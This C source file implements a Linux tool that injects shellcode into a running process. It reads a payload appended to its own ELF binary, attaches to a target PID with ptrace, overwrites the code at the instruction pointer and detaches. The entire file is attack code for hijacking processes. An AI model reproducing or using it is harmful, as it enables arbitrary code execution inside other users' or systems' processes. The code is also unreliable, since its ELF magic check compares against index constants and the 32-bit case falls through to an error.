#include <stdio.h>
#include <elf.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>

#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>

#include <sys/user.h>
#include <sys/reg.h>


// get_file_size() -- get a file's size in bytes
// returns -1 on failure, otherwise number of bytes.
size_t get_file_size(const char *file) {
  struct stat	s;


  if (stat(file, &s) == -1)
    return -1;

  return s.st_size;
}


// get_elf_size() -- get length of ELF data according to file's ELF headers
// returns -1 on failure, otherwise number of bytes.
size_t get_elf_size(const char *elf) {
  int		fd;
  char		*ELFheaderdata;
  Elf64_Ehdr	*ELFheader64;
  Elf32_Ehdr	*ELFheader32;
  size_t	n;


  ELFheaderdata = malloc(64);
  if (ELFheaderdata == NULL)
    return -1;

  fd = open(elf, O_RDONLY);
  if (fd == -1)
    return -1;

  // 32 bit ELF header = 52 bytes, 64 bit ELF header = 64 bytes
  n = read(fd, ELFheaderdata, 64);
  if (n != 64)
    return -1;

  // validate ELF header
  if (ELFheaderdata[0] != EI_MAG0 || ELFheaderdata[1] != EI_MAG1 ||
      ELFheaderdata[2] != EI_MAG2 || ELFheaderdata[3] != EI_MAG3) {
    n = -1;
    goto end;
  }

  switch(ELFheaderdata[4]) {
  case ELFCLASS64: /* 64 bit */
    ELFheader64 = (Elf64_Ehdr *)ELFheaderdata;
    n = ELFheader64->e_shoff + (ELFheader64->e_shnum * ELFheader64->e_shentsize);
    break;

  case ELFCLASS32: /* 32 bit */
    ELFheader32 = (Elf32_Ehdr *)ELFheaderdata;
    n = ELFheader32->e_shoff + (ELFheader32->e_shnum * ELFheader32->e_shentsize);
  default:
    n = -1;
  }

 end:
  free(ELFheaderdata);
  close(fd);

  return n;
}


// get_elfappend_size() -- get size of extra data after valid ELF
// returns -1 on failure, otherwise # bytes
size_t get_elfappend_size(const char *file) {
  size_t	n = get_file_size(file);
  size_t	e = get_elf_size(file);

  if (n == -1 || e == -1)
    return -1;

  return n - e;
}


// get_elfappend_data() -- get the data after valid ELF
// returns the data on success, NULL on failure
void *get_elfappend_data(const char *file) {
  size_t	filesize = get_file_size(file);
  size_t	elfsize  = get_elf_size(file);
  size_t	n = filesize - elfsize;
  FILE		*fp;
  void		*buf;


  if (n == 0)
    return NULL;

  fp = fopen(file, "rb");
  if (fp == NULL)
    return NULL;

  buf = malloc(n);
  if (buf == NULL)
    return NULL;

  fseek(fp, elfsize, SEEK_SET);
  if (fread(buf, 1, n, fp) != n) {
    free(buf);
    fclose(fp);
    return NULL;
  }

  fclose(fp);
  return buf;
}


// inject() -- use ptrace() to inject shellcode into a process
// return -1 on failure, 0 on success
int inject(pid_t pid, unsigned char *src, void *dst, int len) {
  uint32_t	*s = (uint32_t *)src;
  uint32_t	*d = (uint32_t *)dst;

  for (int i = 0; i < len; i += 4, s++, d++)
    if ((ptrace(PTRACE_POKETEXT, pid, d, *s)) < 0)
      return -1;

  return 0;
}


// main() -- entry point
// returns EXIT_SUCCESS on success, EXIT_FAILURE on failure
int main (int argc, char *argv[]) {
  pid_t				pid;
  struct user_regs_struct	regs;
  char				*buf;
  size_t			n;


  if (argc != 2) {
    fprintf(stderr, "usage: %s <pid>\n", argv[0]);
    return EXIT_FAILURE;
  }

  pid = atoi(argv[1]);

  n = get_elfappend_size("/proc/self/exe");
  if (n == -1)
    return EXIT_FAILURE;

  buf = get_elfappend_data(argv[0]);

  if ((ptrace(PTRACE_ATTACH, pid, NULL, NULL)) < 0)
    return EXIT_FAILURE;

  wait(NULL);

  if ((ptrace(PTRACE_GETREGS, pid, NULL, &regs)) < 0)
    return EXIT_FAILURE;

  inject(pid, buf, (void *)regs.rip, n);
  regs.rip += 2;

  if ((ptrace(PTRACE_SETREGS, pid, NULL, &regs)) < 0)
    return EXIT_FAILURE;

  if ((ptrace(PTRACE_DETACH, pid, NULL, NULL)) < 0)
    return EXIT_FAILURE;

  return 0;
}
